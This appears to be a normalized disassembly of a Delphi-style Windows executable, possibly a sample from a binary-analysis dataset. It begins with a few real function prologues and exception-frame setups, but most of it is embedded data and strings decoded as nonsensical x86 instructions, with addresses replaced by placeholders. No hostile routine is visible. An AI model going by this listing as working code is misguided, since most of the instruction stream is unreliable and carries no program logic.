and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_438388
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4383f6
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4383fd
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_4056e0
mov eax rw-data
call sub_4056e0
mov eax rw-data
call sub_4056e0
mov eax rw-data
call sub_404074
mov eax rw-data
call sub_4056e0
mov eax [ rw-data ]
call sub_4379b8
sub_438400
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_438452
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438459
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_438314
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_4056e0
mov edx eax
mov eax [ rw-data ]
call sub_425620
sub_43845c
pushad
test [ ebx ] al
add [ esp + edx * 2 ] ecx
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
test [ ebx + 0x540b0043 ] dh
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebp * 2 - 0x7b ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edi - 0x7b ] si
inc ebx
add ah dh
adc [ eax ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
nop
jl r-xdata
inc esp
jb r-xdata
inc eax
add [ eax ] bh
test [ ebx ] eax
add [ eax ] al
add [ eax ] al
retn
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
add ah dl
mov bl 0x43
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
jo r-xdata
inc ebx
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ ebx + esi * 4 + 0x43 ] bl
add [ eax - 0x4e ] ah
inc ebx
add [ eax ] bl
mov ah 0x43
add [ edx + esi * 4 ] ah
inc ebx
add [ eax - 0x4d ] bh
inc ebx
add [ ebx + esi * 4 + 0x43 ] bh
add [ ebx + esi * 4 - 0x4bbbffbd ] al
inc ebx
add ah dh
mov bl 0x43
add [ esi ] dl
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
test [ ebx ] eax
xor al 0x0
jae r-xdata
add ah cl
xchg [ ebx ] al
inc eax
add [ eax ] al
add [ eax - 0x17ffbc7b ] dl
xor al 0x40
add ah ah
mov bl 0x43
add ah dl
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
xchg [ ebx ] al
cmp al 0x0
add [ eax ] al
in al dx
test [ ebx ] al
call 0xffffffffe443c5f5
mov bl 0x43
add [ ebx + 0x4385dcc0 ] cl
add [ eax ] al
mov al [ 0xffffffffe8004010 ]
xor al 0x40
add ah ah
mov bl 0x43
add ah dl
mov bl 0x43
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ esp + esi * 4 - 0x4b43ffbd ] ah
inc ebx
add [ eax - 0x4e ] ah
add [ eax ] al
int3
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
xchg esp eax
test [ ebx ] al
add eax [ esi ]
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax + 0x6004384 ] dl
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
inc ebx
add [ esp + esi * 4 - 0x4d9fffbd ] bh
inc ebx
outsd
outsb
je r-xdata
mov bl 0x43
add ah bh
xor al 0x40
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x24 ] si
xchg [ ebx ] al
pop es
push ss
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
add al ch
mov dh 0x43
add [ ebx + esi * 4 + 0x43 ] bl
add [ eax - 0x4e ] ah
inc ebx
add [ eax + 0x240043b5 ] ah
mov dl 0x43
add [ eax - 0x4d ] bh
inc ebx
inc ebx
outsd
outsb
je r-xdata
add al ch
mov ah 0x43
add [ esp + esi * 4 + 0x43 ] al
add ah dh
mov bl 0x43
add [ esp + edx * 2 ] dl
inc esp
jb r-xdata
mov bl 0x43
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 + 0x2c ] si
xchg [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop eax
xchg [ ebx ] eax
inc eax
add [ eax ] al
add [ esi + eax * 4 + 0x43 ] dl
add al ch
xor al 0x40
add ah ah
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
xor al [ eax ]
nop
xor al [ eax ]
sbb al 0xb2
inc ebx
add [ eax - 0x4d ] ah
inc ebx
add [ ebx + esi * 4 + 0x43 ] bl
add [ eax - 0x4e ] ah
inc ebx
add ah al
mov cl 0x43
add [ edx + esi * 4 ] ah
outsd
insd
inc ebx
add al ch
xor al 0x40
add ah ah
mov bl 0x43
add ah bh
mov dh 0x43
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
jo r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + ecx - 0x78 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + edi * 4 - 0x79 ] si
inc ebx
add [ eax ] ah
xchg [ ebx ] al
add [ eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebx + esi * 4 + 0x43 ] bh
add [ ebx + esi * 4 - 0x4a03ffbd ] al
inc ebx
add [ esi * 4 - 0x49bbffbd ] cl
inc ebx
mov bl 0x43
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
mov esp 0x4387
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
mov bl 0x43
add [ eax ] cl
mov ch 0x43
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
jo r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x79 ] bl
inc ebx
add [ eax ] al
add [ eax ] al
push esp
xchg [ ebx ] al
call 0xffffffffe443c745
inc ebx
add [ eax ] bl
mov ah 0x43
add [ edx + esi * 4 ] ah
inc ebx
add al cl
mov ah 0x43
add [ ebx + esi * 4 + 0x43 ] bh
inc ebx
add [ esp + esi * 4 - 0x4b43ffbd ] ah
inc ebx
add [ eax - 0x4e ] ah
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
rol [ eax + 0x4388 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x70004388
add [ eax ] al
add [ eax - 0x79 ] dh
inc ebx
add [ eax - 0x4c ] dh
inc ebx
add al ch
mov dh 0x43
add [ ebx + esi * 4 + 0x43 ] bl
add [ eax - 0x4e ] ah
inc ebx
add [ eax + 0x240043b5 ] ah
mov dl 0x43
add [ eax - 0x4d ] bh
inc ebx
add [ ebx + esi * 4 + 0x43 ] bh
add [ ebx + esi * 4 - 0x4a03ffbd ] al
inc ebx
add [ esi * 4 - 0x49bbffbd ] cl
inc ebx
add al al
mov dh 0x43
add ah dl
mov dh 0x43
add ah dh
mov dh 0x43
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax ] al
nop
test [ ebx ] eax
call 0xffffffffe443c7d5
mov bl 0x43
add ah dl
mov bl 0x43
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
jo r-xdata
inc ebx
add [ eax ] bl
mov ah 0x43
add [ edx + esi * 4 ] ah
inc ebx
add al cl
mov ah 0x43
add [ ebx + esi * 4 + 0x43 ] bh
inc ebx
add [ esp + esi * 4 - 0x4d9fffbd ] bh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + ebx * 8 - 0x7b ] si
inc ebx
add [ eax - 0x7b ] ch
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + eax * 4 + 0x43 ] bl
add [ eax + eax ] dh
inc ebx
add [ ebx + esi * 4 + 0x43 ] bh
add [ ebx + esi * 4 + 0x540b0043 ] al
inc ebx
add [ eax - 0x4d ] bh
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
inc ecx
add [ esp + eax * 2 ] dh
inc ecx
add [ eax - 0x1a ] al
inc ecx
add [ esi ] ch
inc ecx
add al bh
enter 0x43 0xe
push esp
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
sbb al 0x89
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x77 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ecx * 4 ] dh
add [ ebx + 0x438880c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ecx * 4 + 0x700043 ] bh
add [ eax ] al
jo r-xdata
xchg [ ebx ] eax
jo r-xdata
add [ edi + eax * 4 + 0x43 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
inc ebx
add [ eax - 0x4c ] dh
add al ch
mov ah 0x43
add [ esp + esi * 4 + 0x43 ] al
add ah dh
mov bl 0x43
add [ edx ] dl
push esp
inc esp
jb r-xdata
inc ebx
outsd
insb
jae r-xdata
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add al al
mov dh 0x43
add ah dl
mov dh 0x43
add ah dh
mov dh 0x43
add [ edi ] cl
push esp
inc esp
jb r-xdata
mov ch 0x43
add [ esi + esi * 4 + 0x43 ] al
add [ ebp - 0x795fffc0 ] cl
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
jae r-xdata
inc ebx
add [ eax + eax ] ah
add al dl
mov esi 0x34e80041
inc eax
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
mov [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x89
dec eax
mov [ ebx ] eax
pop es
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp + ecx * 8 + 0x43 ] bl
add [ eax + 0x80041a9 ] ch
into
inc ebx
add al bh
test al 0x41
add [ ecx + ebp * 4 - 0x561fffbf ] cl
inc ecx
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc eax
test eax 0xcb3c0041
inc ebx
add [ ecx + ebp * 4 + 0x41 ] dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
mov al [ ebx ]
sbb al 0x0
add [ eax ] al
cmp al 0x9d
inc esp
add al ch
xor al 0x40
add ah dh
xor al 0x40
mov [ ebx ] eax
cmp al 0xbf
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ecx
add [ eax - 0x34 ] cl
inc ebx
add [ esp ] ah
inc esp
add [ esp + ecx * 8 - 0x5bb3ffbd ] bh
inc esp
add [ eax - 0x5c ] ah
inc esp
add [ esi + ecx * 8 ] dh
inc ebx
add al dh
int3
outsd
insb
jae r-xdata
add [ ebp - 0x7643ffc0 ] cl
inc ebx
add [ eax ] al
sub_438c97
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
js r-xdata
imul esp [ edi + 0x68 ] 0x438bcc74
add [ eax + eax ] dl
add bh bh
pushfd
0x43
imul esp [ gs : edi + 0x68 ] 0x438bcc74
add [ eax + eax ] cl
add bh bh
pushfd
0x43
sub_438cbb
add [ eax ] eax
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
js r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
pushfd
0x43
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x438d98c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
hlt
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jbe r-xdata
add [ ecx ] al
push esp
push ebx
popad
je r-xdata
inc edx
jne r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add al cl
mov al [ ebx ]
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ esi ] cl
push esp
inc esp
jb r-xdata
outsb
je r-xdata
push 0x3c004010
adc eax [ ecx ]
nop
dec eax
mov es [ ebx ]
or [ esi ] cl
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
hlt
add [ eax - 0x7b ] ch
inc ebx
add [ edi + ecx * 4 + 0xd080043 ] dh
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
je r-xdata
je r-xdata
inc esp
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
push esp
inc ebp
outsb
jb r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp - 0x717bffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x7093ffc0 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
hlt
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] dl
nop
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
push 0xb4004385
pop [ ebx ]
or [ 0x646e4554 ] cl
inc esp
push ebx
outsb
add al 0x8
push es
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
hlt
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
outsb
je r-xdata
inc ebx
jpe r-xdata
pushad
xchg edi eax
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
dec esp
xchg edx eax
inc ebx
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
or [ eax - 0x6e3fffbd ] cl
inc ebx
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4393d4c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
pushad
xchg edi eax
inc ebx
add [ eax ] bh
lahf
inc ebx
add [ eax ] al
adc [ eax ] al
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
or [ eax + 0x103c0043 ] cl
inc eax
add [ eax + edx ] bh
inc eax
add al cl
mov al [ ebx ]
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
aam 0x93
inc ebx
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43934cc0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
nop
or [ ecx + 0xc080043 ] dl
push esp
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x56004395 ] dl
xchg edi eax
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc ebx
add [ eax + eax + 0xc80044 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add ah cl
fadd [ ebx ]
loopne r-xdata
rol [ ebx ] 0x1
mov al dl
inc ebx
add [ esi + ebx * 8 - 0xf6fffbd ] cl
inc ebx
add [ ecx + eax + 0x44 ] cl
add ah cl
loop r-xdata
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add [ edx + esi * 8 ] ah
inc ebx
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
ror bh 0x1
